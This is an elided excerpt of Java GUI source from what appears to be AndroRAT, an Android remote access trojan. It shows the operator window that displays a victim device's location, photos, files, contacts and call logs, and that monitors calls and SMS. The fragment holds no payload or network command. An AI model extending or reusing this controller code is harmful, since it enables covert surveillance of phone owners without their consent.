...
public class UserGUI extends JFrame implements WindowListener {
	...
	public UserGUI(String imei, GUI gui) {
		setIconImage(Toolkit.getDefaultToolkit().getImage(
				UserGUI.class.getResource("/gui/res/androrat_logo_32pix.png")));
		this.imei = imei;
		this.gui = gui;
	...
	public void removeTab(JPanel viewer) {
		...
		if (viewer instanceof MonitorPanel) {
			if (((MonitorPanel) viewer).getCallMonitor()) {
				if (monitorCall.getMonitoring())
					gui.fireStopCallMonitoring(imei,
							panChanMap.get(monitorCall));
				monitorCall = null;
			} else {
				if (monitorSMS.getMonitoring())
					gui.fireStopSMSMonitoring(imei, panChanMap.get(monitorSMS));
	...
	public void updatePreference(String ip, int port, boolean wait,
	...
	public void fireSaveConnectConfigurations(String ip, int port,
	...
	public void updateMap(double lon, double lat, double alt, float speed,
			float accuracy) {
		if (mapPanel != null)
			mapPanel.updateMap(lon, lat, alt, speed, accuracy);
	}
	...
	public void updatePicture(byte[] picture) {
		if (picturePanel != null)
			picturePanel.updateImage(picture);
	}
	...
	public void updateFileTree(ArrayList<MyFile> fileList) {
		if (fileTreePanel != null)
			fileTreePanel.updateFileTree(fileList);
	}
	...
	public void updateCallLogs(ArrayList<CallPacket> logsList) {
		if (callLogPanel != null)
			callLogPanel.updateCallLogs(logsList);
	}
	...
	public void updateContacts(ArrayList<Contact> contacts) {
		if (contactPanel != null)
			contactPanel.updateContactList(contacts);
	}
	...
	public void addMonitoredCall(int type, String phoneNumber) {
		if (monitorCall != null)
			monitorCall.addMonitoredCall(type, phoneNumber);
	}

	public void addMonitoredSMS(String addr, long date, String body) {
		if (monitorSMS != null)
			monitorSMS.addMonitoredSMS(addr, date, body);
	}
	...
	public void fireButtonCloseTab() {
		...
		if (panel == homePanel) {
			JOptionPane.showMessageDialog(this,
					"You can't close the home tab !", "Forbiden action",
	...
	/**
	 * Create the frame. Don't touch the code !!
	 */
	private void initGUI() {
		...
		mntmCloseTabViewer.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_R,
